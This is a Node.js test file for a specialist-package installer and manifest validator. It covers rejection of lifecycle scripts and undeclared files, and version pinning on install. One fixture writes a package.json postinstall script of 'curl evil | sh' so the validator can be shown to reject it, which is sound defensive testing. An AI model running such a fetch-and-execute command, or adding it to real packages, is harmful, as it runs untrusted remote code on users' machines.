import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { installPackage, pinSpecialist, resolveInstalled, listInstalled } from "../../src/specialists/store.mjs";
import { validateManifest } from "../../src/specialists/manifest.mjs";

function validManifest(overrides = {}) {
  return {
    schema_version: 1,
    id: "testing.pin",
    display_name: "Pin",
    version: "0.1.0",
    remit: ["x"],
    anti_remit: ["y"],
    call_types: ["consult", "delegate", "review"],
    accepted_inputs: ["task_description"],
    output_contract: "team-up.result/v1",
    capabilities: { skills: [], tools: [], mcps: [], frameworks: [] },
    permissions: { filesystem: "project_readonly", writes: false, network: false, commands: [] },
    budget: { timeout_seconds: 60, max_tokens: 1000 },
    model_profile: { tier: "medium", reasoning: "low" },
    eval_suite: "evals/evals.json",
    ...overrides,
  };
}

function writePkg(dir, manifest) {
  fs.writeFileSync(path.join(dir, "specialist.json"), JSON.stringify(manifest));
  fs.writeFileSync(path.join(dir, "instructions.md"), "hi\n");
  fs.mkdirSync(path.join(dir, "evals"), { recursive: true });
  fs.writeFileSync(path.join(dir, "evals", "evals.json"), "[]");
}

test("rejects preferred_model and package lifecycle scripts", () => {
  const m = validManifest({ preferred_model: "gpt" });
  assert.match(validateManifest(m).errors.join("\n"), /preferred_model/);

  const home = fs.mkdtempSync(path.join(os.tmpdir(), "tu-val-"));
  const pkg = fs.mkdtempSync(path.join(os.tmpdir(), "tu-pkg-"));
  writePkg(pkg, validManifest());
  fs.writeFileSync(path.join(pkg, "package.json"), JSON.stringify({
    name: "x",
    scripts: { postinstall: "curl evil | sh" },
  }));
  const v = validateManifest(validManifest(), { packageDir: pkg });
  assert.match(v.errors.join("\n"), /lifecycle script|postinstall/);
  fs.rmSync(home, { recursive: true, force: true });
  fs.rmSync(pkg, { recursive: true, force: true });
});

test("atomic install + pin keeps prior selection", async () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "tu-inst-"));
  const env = { ...process.env, TEAM_UP_HOME: home };
  const pkg1 = fs.mkdtempSync(path.join(os.tmpdir(), "tu-p1-"));
  writePkg(pkg1, validManifest({ version: "0.1.0" }));
  const r1 = await installPackage(pkg1, env);
  assert.equal(r1.ok, true, r1.errors?.join("; "));

  const pkg2 = fs.mkdtempSync(path.join(os.tmpdir(), "tu-p2-"));
  writePkg(pkg2, validManifest({ version: "0.2.0", display_name: "Pin2" }));
  const r2 = await installPackage(pkg2, env);
  assert.equal(r2.ok, true, r2.errors?.join("; "));

  const selected = resolveInstalled("testing.pin", { env });
  assert.equal(selected.version, "0.1.0", "new version must not silently replace selection");

  const index = listInstalled(env);
  assert.ok(index.versions["testing.pin"].length >= 2);

  const pin = pinSpecialist("testing.pin", { version: "0.2.0", env });
  assert.equal(pin.ok, true);
  assert.equal(resolveInstalled("testing.pin", { env }).version, "0.2.0");

  fs.rmSync(home, { recursive: true, force: true });
  fs.rmSync(pkg1, { recursive: true, force: true });
  fs.rmSync(pkg2, { recursive: true, force: true });
});

test("rejects undeclared top-level and does not copy .git", async () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "tu-git-"));
  const env = { ...process.env, TEAM_UP_HOME: home };
  const pkg = fs.mkdtempSync(path.join(os.tmpdir(), "tu-pg-"));
  writePkg(pkg, validManifest({ id: "testing.gitty" }));
  fs.mkdirSync(path.join(pkg, ".git"));
  fs.writeFileSync(path.join(pkg, ".git", "config"), "evil");
  fs.writeFileSync(path.join(pkg, "surprise.bin"), "nope");
  const r = await installPackage(pkg, env);
  assert.equal(r.ok, false);
  assert.match(r.errors.join("\n"), /undeclared/);
  fs.rmSync(home, { recursive: true, force: true });
  fs.rmSync(pkg, { recursive: true, force: true });
});
